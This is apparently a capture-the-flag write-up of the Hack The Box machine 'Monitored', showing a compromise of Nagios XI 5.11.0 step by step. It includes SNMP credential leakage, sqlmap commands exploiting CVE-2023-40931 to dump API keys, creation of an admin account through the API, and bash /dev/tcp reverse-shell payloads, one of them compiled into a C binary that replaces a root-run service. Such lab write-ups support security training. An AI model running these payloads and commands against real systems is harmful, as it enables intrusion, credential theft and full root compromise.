---
name: Monitored
difficulty: Medium
os: Linux
thumbnail: https://labs.hackthebox.com/storage/avatars/d4988810825d26acb2e84ca0ac9feaf4.png
active: false
---
Starting off with an nmap to see what's open:
```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

If we navigate to [http://monitored.htb/](http://monitored.htb/) we won't find anything too interesting. We can also visit [http://nagios.monitored.htb/](http://nagios.monitored.htb/), Nagios is a log and monitoring solution. We don't have credentials to sign in though.
![](/images/htb/monitored/nagiosLogin.png)

After spending a lot of time researching ldap and nagios, we need to enumerate further. We can nmap scan for UDP ports:
```bash
$ sudo nmap -sU -oA nmap/monitoredUDP monitored.htb
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
123/udp   open          ntp
161/udp   open          snmp
162/udp   open|filtered snmptrap
515/udp   open|filtered printer
3052/udp  open|filtered apc-3052
44190/udp open|filtered unknown
```

Here we find a couple of snmp ports, we can run `snmapbulkwalk` to find any public info.
```bash
$ snmpbulkwalk -v 2c -c public monitored.htb 1 > snmpwalk.out
...
iso.3.6.1.2.1.25.4.2.1.5.1455 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1456 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
...
```

After looking through the entire output, we can find some potential user credentials:
user: `svc`
pass: `XjH7VCehowpR1xZB`

# Enumerate NagiosXI
If we try to use these credentials on the NagiosXI panel, it'll say that our token has expired.

We'll use gobuster to search for directories while poking around:
```bash
$ gobuster dir -u https://nagios.monitored.htb/nagiosxi/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -k  -t 4 --delay 1s -o gobuster.out
api [200]
```

We can do some more research on the nagiosxi api. We can authenticate using tokens: [https://www.nagios.org/ncpa/help/2.0/api.html](https://www.nagios.org/ncpa/help/2.0/api.html)
Couldn't find much in their docs, but I did find this forum post: [https://support.nagios.com/forum/viewtopic.php?t=58783](https://support.nagios.com/forum/viewtopic.php?t=58783)

Someone responds with a curl command used to authenticate, entering the `svc` creds we get can get our token:
```bash
$ curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "ce0b123ce1c5817801d284d790b08763e4965e75",
    "valid_min": 5,
    "valid_until": "Mon, 03 Jun 2024 04:15:01 -0400"
}
```

Going back I went to the login site added `?token={auth_token}` as a query parameter and we're in the panel now. In the bottom banner we can see that it's running version `5.11.0`

If we navigate to the account page, we'll find the API key for `svc`: `2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK`
![](/images/htb/monitored/nagiosAccount.png)

If we do a quick search on `Nagios 5.11.0` we'll quickly find [CVE-2023–40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)
The ID parameter on the endpoint `/nagiosxi/admin/banner_message-ajaxhelper.php` is vulnerable to SQLI.
# Using sqlmap
To start I ran sqlmap to find what databases were available:
```bash
$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" --cookie "nagiosxi=busp3tpjtbvc4tngeg8or3sg2t" --dbs
available databases [2]:
[*] information_schema
[*] nagiosxi
```

Now we'll target `nagiosxi` and dump the tables:
```bash
$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" --cookie "nagiosxi=busp3tpjtbvc4tngeg8or3sg2t" -D nagiosxi --tables
Database: nagiosxi
[22 tables]
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+
```

And then dump `xi_users`:
```bash
$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" --cookie "nagiosxi=busp3tpjtbvc4tngeg8or3sg2t" -D nagiosxi -T xi_users --dump
| username    | api_key                                                          | enabled | api_enabled |
|-------------|------------------------------------------------------------------|---------|-------------|
| nagiosadmin | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | 1           |
| svc         | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | 1           |
```

We find an API key for `nagiosadmin`, there was a hash but it wasn't crackable sadly.
# Exploiting Admin API
Now that we have an API key, lets see what we can do. My first thought is being able to make my own elevated account on the site.
The Nagios docs isn't the best, so I downloaded the 5.11.0 release from their site and looked through the codebase instead: [https://assets.nagios.com/downloads/nagiosxi/versions.php](https://assets.nagios.com/downloads/nagiosxi/versions.php)

Here we find the file `/nagiosxi/basedir/html/api/includes/utils-system.inc.php`
On line 112 we find the endpoint `user` which calls the function `api_system_add_user($args)`. In this function it details the args needed to create an account.

After that we can simply send a post request to create our account, with the `auth_level` of `admin`.
```bash
$ curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d 'username=cinder&email=cinder%40yo.com&name=Cinder&password=12345678&auth_level=admin' --insecure
```
# NagiosXI RCE
Now we can sign into the panel as an admin.

If we navigate to `Configure > Core Config Manager > Commands` we can add our own "check" command with a simple reverse shell payload: `bash -c 'bash -i -p >& /dev/tcp/10.10.15.64/4444 0>&1'`
![](/images/htb/monitored/nagiosPayload.png)

Then to get the command to actually run you can make a new service at `Configure > Core Config Manager > Services`, and select "payload" as our check command.
![](/images/htb/monitored/nagiosRCE.png)

After listening on port 4444 and pressing "Run Check Command", we now have a shell. 
# Priveledge Escalation
As usual to begin LPE enumeration, we'll run linpeas.

The first thing that catches my attention is some writeable executables:
```bash
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
/etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
```

If we look at our `sudo -l`, we'll also find that we can run a bunch of files as root:
```bash
$ sudo -l
User nagios may run the following commands on localhost:
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

My idea is that if we can write the `nagios` binary, and then restart it then we can escalate.
This makes the `manage_services.sh` script seem very promising. Looking at the code we can see how to restart nagios.

Now we just need to craft our own binary to replace this:
```bash
$ file /usr/local/nagios/bin/nagios
/usr/local/nagios/bin/nagios: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b85a64b43ce4caee5faf916c714dc55933e0842d, for GNU/Linux 3.2.0, stripped
```

Simple enough, we'll make a C file that will give us a new reverse shell.
```c
include <stdlib.h>

int main() {
    system("bash -c 'bash -i -p >& /dev/tcp/10.10.15.64/4443 0>&1'");
    return 0;
}
```

Compile, move it, and give it execute perms:
```bash
$ gcc exploit.c -o exploit
$ mv exploit /usr/local/nagios/bin/nagios
$ chmod +x /usr/local/nagios/bin/nagios
```

Now if we listen on 4443 and run `manage_services.sh`, we can get root.
```bash
$ nc -lvnp 4443
listening on [any] 4443 ...
```

```bash
$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
```

```bash
connect to [10.10.15.64] from (UNKNOWN) [10.129.230.96] 37076
bash: cannot set terminal process group (78221): Inappropriate ioctl for device
bash: no job control in this shell
root@monitored:/# whoami
root
```